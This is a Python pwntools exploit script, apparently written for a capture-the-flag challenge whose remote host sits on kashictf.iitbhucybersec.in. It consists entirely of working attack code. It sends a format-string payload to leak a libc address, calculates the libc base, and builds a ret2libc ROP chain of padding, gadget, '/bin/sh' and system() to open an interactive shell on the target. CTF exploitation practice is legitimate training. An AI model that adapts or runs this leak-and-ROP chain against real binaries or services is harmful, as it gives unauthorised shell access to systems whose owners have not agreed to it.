#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("kashictf.iitbhucybersec.in", 51798)

    return r


def main():
    ret = 0x0000000000401016
    offset = 40
    r = conn()
    r.sendline("%17$p")
    r.recvuntil(b"Lmao not giving you ")
    libc_leak = int(r.recvline().strip().decode(),16)
    log.info(hex(libc_leak))
    # good luck pwning :)
    libc.address = libc_leak - 0x2724a
    log.info(hex(libc.address))
    system = libc.sym['system']
    bin_sh = next(libc.search(b"/bin/sh"))
    rop = ROP(exe)
    rop.raw(b"A" * offset)
    rop.raw(libc.address + 0x00000000000277e5)
    rop.raw(bin_sh)
    rop.raw(ret)
    rop.raw(system)
    r.sendline(rop.chain())
    r.interactive()


if __name__ == "__main__":
    main()
